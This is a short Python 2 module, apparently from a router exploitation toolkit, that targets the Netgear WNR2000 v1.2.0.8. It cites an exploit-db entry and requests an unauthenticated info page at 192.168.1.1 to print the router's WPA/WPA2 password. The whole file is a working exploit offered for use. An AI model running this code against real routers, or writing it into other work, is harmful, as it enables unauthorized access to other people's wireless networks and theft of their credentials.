import util
import urllib

#
# Netgear router vulnerabilities
#

#
# list of supported vulns
#
def vulnerabilities():
	return [ 'WNR2000 v1.2.0.8 - Read WPA/WPA2 Password'
		   ]

#
# run given vuln
#
def run ( run ):
	if run == 1:
		# http://www.exploit-db.com/exploits/9498/
		print '[+] Running ', vulnerabilities()[0]
		url = 'http://192.168.1.1:80/router-info.htm'
		try:
			response = urllib.urlopen(url)
		except Exception, j:
			print '[-] Error connecting to host: ', j
			return
		print response.read()
	else:
		return
